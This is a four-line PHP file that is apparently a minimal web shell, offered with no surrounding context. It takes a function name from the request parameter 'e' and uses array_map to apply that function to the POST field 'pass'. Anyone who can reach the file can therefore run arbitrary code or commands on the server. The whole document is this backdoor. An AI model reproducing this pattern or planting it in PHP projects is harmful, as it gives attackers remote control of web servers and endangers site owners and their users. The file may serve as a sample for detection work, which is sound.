<?php
$e = $_REQUEST['e'];
$arr = array($_POST['pass'],);
array_map($e, $arr);